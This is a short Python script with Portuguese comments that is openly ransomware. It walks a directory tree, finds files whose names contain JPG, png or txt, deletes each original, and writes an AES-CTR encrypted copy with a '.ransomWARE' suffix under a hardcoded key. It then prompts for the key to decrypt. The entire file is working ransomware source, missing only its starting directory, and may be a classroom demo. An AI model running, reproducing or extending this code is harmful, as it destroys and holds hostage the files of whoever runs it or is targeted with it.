import os
import pyaes

arquivos_brutos = []
pastas = []
lista_de_arquivo = []
path_completo = []
lista_de_extensoes = ["JPG", "png", "txt"]  #Adicionar as extensões que vão ser criptografadas

key = b"fk2yla7hf6ya1fg9" #Chave de criptografia

def encrypt(caminhos):
    for caminho in caminhos:

        #Lendo o conteúdo do ARQUIVO
        with open(caminho, "rb") as arquivo:
            arquivo_lido = arquivo.read()
        os.remove(caminho)

        ##criptografar o arquivo
        aes = pyaes.AESModeOfOperationCTR(key)
        arquivo_criptografado = aes.encrypt(arquivo_lido)
        novo_arquivo = open(caminho + ".ransomWARE", "wb")
        novo_arquivo.write(arquivo_criptografado)
        novo_arquivo.close()

def decrypt(caminhos):
    for caminho in caminhos:

        #Lendo o arquivo criptografado
        with open(caminho +".ransomWARE", "rb") as arquivo:
            arquivo_lido = arquivo.read()
        os.remove(caminho + ".ransomWARE")

        #Descriptografando o arquivo
        aes = pyaes.AESModeOfOperationCTR(key)
        arquivo_descriptografado = aes.decrypt(arquivo_lido)

        #Escrevendo o arquivo descriptografado
        novo_arquivo = open(caminho.removesuffix(".ransomWARE"), "wb")
        novo_arquivo.write(arquivo_descriptografado)
        novo_arquivo.close()


#Buscando arquivos para criptografar
for root, dirs, files in os.walk(#COLOCAR O LOCAL INICIAL DA CRIPTOGRAFIA. EX: C: ):

    arquivos_brutos.append(files)
    for arquivos_diversos in arquivos_brutos:

        for arquivo in arquivos_diversos:

            if arquivo not in lista_de_arquivo:
                for extensao in lista_de_extensoes:
                    if extensao in arquivo:
                        lista_de_arquivo.append(arquivo)
                        path_completo.append(f"{root}"+ "\\" + f"{arquivo}")

encrypt(path_completo)

chave = input("Digite a key para DESCRIPTOGRAFAR: ")


if key == bytes(chave, 'utf-8'):
    print("CHAVE ACEITA!")
    decrypt(path_completo)
    print("DESCRIPTOGRAFADO COM SUCESSO!!!")
else:
    print("Chave de descriptografia INVÁLIDA! Encerrando o processo!!!!")